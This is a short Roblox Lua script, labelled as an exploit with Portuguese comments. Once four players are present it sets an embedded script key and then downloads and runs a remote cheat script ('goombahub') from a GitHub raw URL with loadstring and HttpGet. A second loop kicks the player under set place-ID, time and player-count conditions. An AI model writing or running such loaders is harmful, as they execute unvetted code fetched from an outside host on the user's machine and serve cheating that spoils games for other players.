-- LocalScript (Exploit)
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local placeIdCorreto = 17687504411
local tempoEntrada = tick()

-- Loop 1: Executa o loadstring uma vez quando >= 4 jogadores
task.spawn(function()
	while true do
		task.wait(5)
		local jogadores = #Players:GetPlayers()

		if jogadores >= 4 then
			script_key="uQQTiRbZBrfLlMReDcDsqMHUwLopfdHb";
			loadstring(game:HttpGet("https://raw.githubusercontent.com/JustLevel/goombahub/main/goombahub.lua"))()
			break -- Encerra esse loop após executar
		end
	end
end)

-- Loop 2: Verifica desconexão por PlaceId errado, tempo e número de jogadores
while true do
	task.wait(5)

	local jogadores = #Players:GetPlayers()
	local tempoNoJogo = tick() - tempoEntrada
	local placeIdAtual = game.PlaceId

	if placeIdAtual ~= placeIdCorreto and tempoNoJogo >= 180 and jogadores < 4 then
		LocalPlayer:Kick("Desconectado: menos de 4 jogadores após 3 minutos em lugar incorreto.")
		break
	end
end

print("start")
